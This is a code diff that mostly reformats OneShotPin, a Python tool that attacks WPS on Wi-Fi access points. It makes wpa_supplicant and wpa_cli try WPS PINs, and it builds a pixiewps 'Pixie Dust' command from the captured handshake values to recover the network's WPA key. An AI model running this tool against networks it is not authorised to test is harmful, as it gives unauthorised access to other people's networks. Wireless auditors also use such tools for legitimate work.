@@ -18,17 +18,14 @@ class Data():
         self.wpa_psk = ''
         self.state = ''
 
-
     def clear(self):
         self.__init__()
-
 
     def got_all(self):
         return self.pke and self.pkr and self.e_nonce and self.authkey and self.e_hash1 and self.e_hash2
 
-
     def get_pixie_cmd(self):
-        return "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} --authkey {} --e-nonce {}".format(\
+        return "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} --authkey {} --e-nonce {}".format(
             self.pke, data.pkr, self.e_hash1, self.e_hash2, self.authkey, self.e_nonce)
 
 
@@ -53,9 +50,11 @@ def recvuntil(pipe, what):
     s = ''
     while True:
         inp = pipe.stdout.read(1)
-        if inp == '': return s
+        if inp == '':
+            return s
         s += inp
-        if what in s: return s
+        if what in s:
+            return s
 
 
 def run_wpa_supplicant(options):
@@ -70,7 +69,8 @@ def run_wpa_supplicant(options):
 
 def run_wpa_cli(options):
     cmd = 'wpa_cli -i{} -p{}'.format(options.interface, options.tempdir)
-    proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8')
+    proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                            stderr=subprocess.STDOUT, encoding='utf-8')
     recvuntil(proc, '\n>')
     return proc
 
@@ -78,12 +78,12 @@ def run_wpa_cli(options):
 def wps_reg(options):
     cmd = 'wpa_cli -i{} -p{}'.format(options.interface, options.tempdir)
     command = 'wps_reg {} {}\nquit\n'.format(options.bssid, options.pin)
-    proc = subprocess.run(cmd, shell=True, input=command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8')
+    proc = subprocess.run(cmd, shell=True, input=command, stdout=subprocess.PIPE,
+                          stderr=subprocess.STDOUT, encoding='utf-8')
     status = False
     if 'OK' in proc.stdout:
         status = True
     return status
-
 
 
 def statechange(data, old, new):
@@ -92,8 +92,8 @@ def statechange(data, old, new):
 
 
 def get_hex(line):
-        a = line.split(':', 3)
-        return a[2].replace(' ', '')
+    a = line.split(':', 3)
+    return a[2].replace(' ', '')
 
 
 def process_wpa_supplicant(pipe, options, data):
@@ -181,7 +181,8 @@ def poll_wpa_supplicant(wpas, options, data):
     while True:
         res = process_wpa_supplicant(wpas, options, data)
 
-        if not res: break
+        if not res:
+            break
         if data.state == 'WSC_NACK':
             print('[-] Error: wrong PIN code')
             break
@@ -205,7 +206,8 @@ def connect(options, data):
         while True:
             s = recvuntil(wpas, '\n')
             if options.verbose: sys.stderr.write(s)
-            if 'update_config=1' in s: break
+            if 'update_config=1' in s:
+                break
     except KeyboardInterrupt:
         print("\nAborting...")
         cleanup(wpas, options)
@@ -239,8 +241,7 @@ def die(msg):
 
 
 def usage():
-    die( \
-"""
+    die("""
 OneShotPin
 
 Required Arguments:
@@ -253,8 +254,8 @@ Optional Arguments:
     -v                       Verbose output
 
 Example:
-    %s -i wlan0 -b 00:90:4C:C1:AC:21 -K
-""" % sys.argv[0])
+    {} -i wlan0 -b 00:90:4C:C1:AC:21 -K
+""".format(sys.argv[0]))
 
 
 def cleanup(wpas, options):
@@ -262,13 +263,14 @@ def cleanup(wpas, options):
     shutil.rmtree(options.tempdir, ignore_errors=True)
     os.remove(options.tempconf)
 
+
 if __name__ == '__main__':
     options = Options()
 
     import getopt
     optlist, args = getopt.getopt(sys.argv[1:], ":e:i:b:p:Kv", ["help", "interface", "bssid", "pin", "pixie-dust"])
-    for a,b in optlist:
-        if   a in ('-i', "--interface"): options.interface = b
+    for a, b in optlist:
+        if a in ('-i', "--interface"): options.interface = b
         elif a in ('-b', "--bssid"): options.bssid = b.upper()
         elif a in ('-p', "--pin"): options.pin = b
         elif a in ('-K', "--pixie-dust"): options.pixiemode = True
@@ -276,16 +278,17 @@ if __name__ == '__main__':
         elif a == '--help': usage()
     if not options.interface or not options.bssid:
         die("Missing required argument! (use --help for usage)")
-    if options.pin == None and not options.pixiemode:
-        die("You need to supply a pin or enable pixiemode! (use --help for usage)")
-    if options.pin == None and options.pixiemode:
-        options.pin = '12345670'
+    if options.pin is None:
+        if not options.pixiemode:
+            die("You need to supply a pin or enable pixiemode! (use --help for usage)")
+        else:
+            options.pin = '12345670'
 
     if os.getuid() != 0:
         die("Run it as root")
 
     data = Data()
-    
+
     connect(options, data)
 
     if data.wpa_psk:
